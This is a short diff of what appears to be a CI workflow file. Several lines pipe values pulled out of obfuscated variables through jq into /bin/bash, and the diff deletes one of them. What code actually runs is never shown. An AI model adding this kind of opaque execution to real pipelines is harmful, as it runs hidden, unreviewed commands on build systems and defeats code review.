@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$q8" | jq -r .rwxl3388 | /bin/bash
           printf '%s' "$vybf0" | jq -r .aflj20210 | /bin/bash
           printf '%s' "$mf75886" | jq -r .iafx24 | /bin/bash
-          printf '%s' "$y6" | jq -r .wbmfp5 | /bin/bash
           echo $qrhma4 | jq -r .pt7 | /bin/bash
 
       - name: Store results
